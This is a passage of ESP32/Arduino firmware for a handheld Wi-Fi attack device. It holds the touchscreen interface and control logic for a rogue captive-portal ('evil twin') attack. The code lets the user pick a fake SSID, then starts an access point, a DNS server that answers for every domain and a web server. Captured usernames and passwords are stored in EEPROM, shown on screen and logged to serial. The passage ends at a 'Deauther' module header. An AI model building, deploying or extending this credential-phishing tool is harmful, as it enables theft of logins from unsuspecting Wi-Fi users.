
  displayPrint(attackActive ? "Status: Active" : "Status: Inactive", GREEN, false);

}

void drawInputField() {
  tft.fillRect(10, 55, 220, 25, TFT_DARKGREY);
  tft.drawRect(9, 54, 222, 27, ORANGE);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(2);
  tft.setCursor(15, 60);
  String displayText = inputSSID;
  if (cursorState && keyboardActive) {
    displayText += "|";
  }
  tft.println(displayText);
}

void drawKeyboard() {
  currentScreen = KEYBOARD;
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  tft.setTextColor(ORANGE);
  tft.setTextSize(1);
  tft.setCursor(1, 230);
  tft.println("[!] Set the SSID that your AP will use");
  tft.setCursor(20, 245);
  tft.println("to host the captive portal.");

  tft.setCursor(1, 270);
  tft.println("[!] Shuffle: Randomly generates SSID");
  tft.setCursor(20, 285);
  tft.println("suggestions for your access point.");

  drawInputField();

  int yOffset = 95;
  for (int row = 0; row < 4; row++) {
    int xOffset = 1;
    for (int col = 0; col < strlen(keyboardLayout[row]); col++) {
      tft.fillRect(xOffset, yOffset, keyWidth, keyHeight, TFT_DARKGREY);
      tft.setTextColor(TFT_WHITE);
      tft.setTextSize(1);
      tft.setCursor(xOffset + 6, yOffset + 5);
      tft.print(keyboardLayout[row][col]);
      Serial.printf("Key %c at x=%d-%d, y=%d-%d\n", keyboardLayout[row][col], xOffset, xOffset + keyWidth, yOffset, yOffset + keyHeight);
      xOffset += keyWidth + keySpacing;
    }
    yOffset += keyHeight + keySpacing;
  }

tft.setTextColor(ORANGE); 
tft.setTextSize(1); 
tft.setTextDatum(MC_DATUM); 

// Back Button
tft.fillRoundRect(5, 185, 70, 25, 4, DARK_GRAY); 
tft.drawRoundRect(5, 185, 70, 25, 4, ORANGE); 
tft.drawString("Back", 40, 197); 
Serial.printf("Back button at x=5-75, y=185-210\n");

// Series Button
tft.fillRoundRect(85, 185, 70, 25, 4, DARK_GRAY); 
tft.drawRoundRect(85, 185, 70, 25, 4, ORANGE); 
tft.drawString("Shuffle", 120, 197); 
Serial.printf("Series button at x=85-155, y=185-210\n");

// OK Button
tft.fillRoundRect(165, 185, 70, 25, 4, DARK_GRAY); 
tft.drawRoundRect(165, 185, 70, 25, 4, ORANGE); 
tft.drawString("OK", 200, 197); 
Serial.printf("OK button at x=165-235, y=185-210\n");
}

void drawCredList() {
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(1);
  tft.setCursor(0, 50);
  tft.println("Credentials List:");

  tft.setCursor(0, 70);
  tft.print("User");
  tft.setCursor(80, 70);
  tft.print("Pass");
  tft.setCursor(160, 70);
  tft.print("SSID");
  tft.drawLine(0, 80, 245, 80, TFT_WHITE);

  int count = EEPROM.read(COUNT_ADDR);
  Serial.printf("Reading %d credentials from EEPROM\n", count);

  int startIdx = credPage * 18;
  int yOffset = 90;

  if (count == 0) {
    tft.setCursor(0, yOffset);
    tft.println("No credentials");
    Serial.println("No credentials found");
  } else {
    for (int i = startIdx; i < min(count, startIdx + 18); i++) {
      Credential cred;
      EEPROM.get(CRED_ADDR + (i * CRED_SIZE), cred);
      Serial.printf("Credential %d at address %d: User=%s, Pass=%s, SSID=%s\n",
                    i, CRED_ADDR + (i * CRED_SIZE), cred.username, cred.password, cred.ssid);
                    
      tft.setTextColor(TFT_WHITE);
      tft.setCursor(0, yOffset);
      tft.println(cred.username);
      tft.setCursor(80, yOffset);
      tft.println(cred.password);
      tft.setCursor(160, yOffset);
      tft.println(cred.ssid);

      //tft.fillRect(225, yOffset - 3, 7, 7, TFT_RED);
      tft.setTextColor(TFT_RED);
      tft.setCursor(223, yOffset - 1);
      tft.println("X");

      yOffset += 10;
    }
  }

int buttonY = 290; 
tft.setTextColor(ORANGE); 
tft.setTextSize(1); 
tft.setTextDatum(MC_DATUM); 

tft.fillRoundRect(5, buttonY, 50, 20, 8, DARK_GRAY);
tft.drawRoundRect(5, buttonY, 50, 20, 8, ORANGE); 
tft.drawString("Back", 30, buttonY + 10);

tft.fillRoundRect(65, buttonY, 50, 20, 8, DARK_GRAY);
tft.drawRoundRect(65, buttonY, 50, 20, 8, ORANGE);
tft.drawString("Clear", 90, buttonY + 10);

tft.fillRoundRect(125, buttonY, 50, 20, 8, DARK_GRAY);
tft.drawRoundRect(125, buttonY, 50, 20, 8, ORANGE);
tft.drawString("Refr", 150, buttonY + 10);

if (credPage > 0) {
  tft.fillRoundRect(185, buttonY, 50, 20, 8, DARK_GRAY);
  tft.drawRoundRect(185, buttonY, 50, 20, 8, ORANGE);
  tft.drawString("Prev", 210, buttonY + 10);
} else if (count > (credPage + 1) * 15) {
  tft.fillRoundRect(185, buttonY, 50, 20, 8, DARK_GRAY);
  tft.drawRoundRect(185, buttonY, 50, 20, 8, ORANGE);
  tft.drawString("Next", 210, buttonY + 10);
}

}

void stopAttack() {
  if (attackActive) {
    WiFi.softAPdisconnect(true);
    Serial.println("Access Point stopped");
    displayPrint("Access Point stopped", GREEN, false);

    dnsServer.stop();
    Serial.println("DNS server stopped");
    displayPrint("DNS server stopped", GREEN, false);

    server.close();
    Serial.println("Web server stopped");
    displayPrint("Web server stopped", GREEN, false);

    attackActive = false;
    drawMainMenu();
  } else {
    Serial.println("Attack already inactive");
    displayPrint("Attack already inactive", GREEN, false);
  }
}

void startAttack() {
  if (!attackActive) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(custom_ssid, password);
    Serial.println("Access Point started");
    Serial.print("IP Address: ");
    Serial.println(WiFi.softAPIP());
    int ip = WiFi.softAPIP();
    displayPrint("Access Point started", GREEN, false);

    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    Serial.println("DNS server started");
    displayPrint("DNS server started", GREEN, false);

    setupWebServer();
    server.begin();
    Serial.println("Web server started");
    displayPrint("Web server started", GREEN, false);

    attackActive = true;
    drawMainMenu();
  } else {
    Serial.println("Attack already active");
    displayPrint("Attack already active", GREEN, false);
  }
}

void handleMainMenu(int x, int y) {}

void handleKeyboard(int x, int y) {
  int yOffset = 95;
  for (int row = 0; row < 4; row++) {
    int xOffset = 1;
    for (int col = 0; col < strlen(keyboardLayout[row]); col++) {
      if (x >= xOffset && x <= xOffset + keyWidth && y >= yOffset && y <= yOffset + keyHeight) {
        char c = keyboardLayout[row][col];
        Serial.printf("Key pressed: %c at x=%d, y=%d\n", c, x, y);
        tft.fillRect(xOffset, yOffset, keyWidth, keyHeight, ORANGE);
        tft.setTextColor(TFT_WHITE);
        tft.setTextSize(1);
        tft.setCursor(xOffset + 6, yOffset + 5);
        tft.print(c);
        delay(100);
        tft.fillRect(xOffset, yOffset, keyWidth, keyHeight, TFT_DARKGREY);
        tft.setTextColor(TFT_WHITE);
        tft.setCursor(xOffset + 6, yOffset + 5);
        tft.print(c);
        if (c == '<') {
          if (inputSSID.length() > 0) {
            inputSSID = inputSSID.substring(0, inputSSID.length() - 1);
          }
        } else if (c == '-') {
          inputSSID = "";
        } else if (c != ' ') {
          inputSSID += c;
        }
        drawInputField();
      }
      xOffset += keyWidth + keySpacing;
    }
    yOffset += keyHeight + keySpacing;
  }

  if (x >= 5 && x <= 75 && y >= 185 && y <= 210) {
    Serial.printf("Back button pressed at x=%d, y=%d\n", x, y);
    currentScreen = MAIN_MENU;
    keyboardActive = false;
    inputSSID = "";
    drawMainMenu();
  }

  if (x >= 85 && x <= 155 && y >= 185 && y <= 210) {
    Serial.printf("Series button pressed at x=%d, y=%d\n", x, y);
    inputSSID = seriesSSIDs[seriesSSIDIndex];
    seriesSSIDIndex = (seriesSSIDIndex + 1) % numSeriesSSIDs;
    drawInputField();
  }

  if (x >= 165 && x <= 235 && y >= 185 && y <= 210) {
    Serial.printf("OK button pressed at x=%d, y=%d\n", x, y);
    if (inputSSID.length() > 0) {
      saveSSID(inputSSID);
      currentScreen = MAIN_MENU;
      keyboardActive = false;
      drawMainMenu();
    } else {
      Serial.println("No SSID entered");
    }
  }
}

void handleCredList(int x, int y) {
  int count = EEPROM.read(COUNT_ADDR);
  int startIdx = credPage * 18;
  int yOffset = 80;

  for (int i = startIdx; i < min(count, startIdx + 18); i++) {
    if (x >= 220 && x <= 230 && y >= yOffset - 3 && y <= yOffset + 7) {
      Serial.println("Delete button pressed for credential " + String(i));
      deleteCredential(i);
      drawCredList();
      return;
    }
    yOffset += 10;
  }

  int buttonY = 290; // Match drawing code
  
  if (x >= 5 && x <= 55 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Back button pressed");
    currentScreen = MAIN_MENU;
    drawMainMenu();
  }
  if (x >= 65 && x <= 115 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Clear All button pressed");
    clearAllCredentials();
    credPage = 0;
    drawCredList();
  }
  if (x >= 125 && x <= 175 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Refresh button pressed");
    drawCredList();
  }
  if (credPage > 0 && x >= 185 && x <= 235 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Prev button pressed");
    credPage--;
    drawCredList();
  } else if (count > (credPage + 1) * 15 && x >= 185 && x <= 235 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Next button pressed");
    credPage++;
    drawCredList();
  }
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 5

  static int iconX[ICON_NUM] = {130, 160, 190, 220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_dialog,  
    bitmap_icon_list,     
    bitmap_icon_antenna,             
    bitmap_icon_power,
    bitmap_icon_go_back // Added back icon
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;  
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0: 
      break;

    case 1: 
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3: 
      switch (activeIcon) {
        case 0:
          currentScreen = KEYBOARD;
          keyboardActive = true;
          inputSSID = "";
          cursorState = false;
          lastCursorToggle = millis();
          drawKeyboard();
          animationState = 0;
          activeIcon = -1;
          break;
        case 1:
          currentScreen = CRED_LIST;
          credPage = 0;
          drawCredList();
          animationState = 0;
          activeIcon = -1;
          break;
        case 2:
          startAttack();
          animationState = 0;
          activeIcon = -1;
          break;
        case 3:
          stopAttack();
          animationState = 0;
          activeIcon = -1;
          break;

         case 4: // Back icon action (exit to submenu)
           feature_exit_requested = true;
           animationState = 0;
           activeIcon = -1;
          break;
      }
      break;

    case 4: break;
    case 5: break;
  }


  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;  

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

     if (currentScreen == KEYBOARD) {
      handleKeyboard(x, y);
    } else if (currentScreen == CRED_LIST) {
      handleCredList(x, y);
    } else {
      handleMainMenu(x, y);
    }

      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void cportalSetup() {

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);
  runUI();

  EEPROM.begin(EEPROM_SIZE);
  int count = EEPROM.read(COUNT_ADDR);
  if (count > MAX_CREDS || count < 0) {
    Serial.println("Invalid credential count, resetting to 0");
    EEPROM.write(COUNT_ADDR, 0);
    EEPROM.commit();
  }
  loadSSID();

  startAttack();
  stopAttack();

  drawMainMenu();
  setupTouchscreen();
}

void cportalLoop() {

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  updateStatusBar();
  runUI();
  
  if (attackActive) {
    dnsServer.processNextRequest();
    server.handleClient();
  }

  if (currentScreen == KEYBOARD) {
    unsigned long now = millis();
    if (now - lastCursorToggle >= 500) {
      cursorState = !cursorState;
      lastCursorToggle = now;
      drawInputField();
      }
    }
  }
} 


/*
 * 
 * 
 * Deauther
 * 
 * 
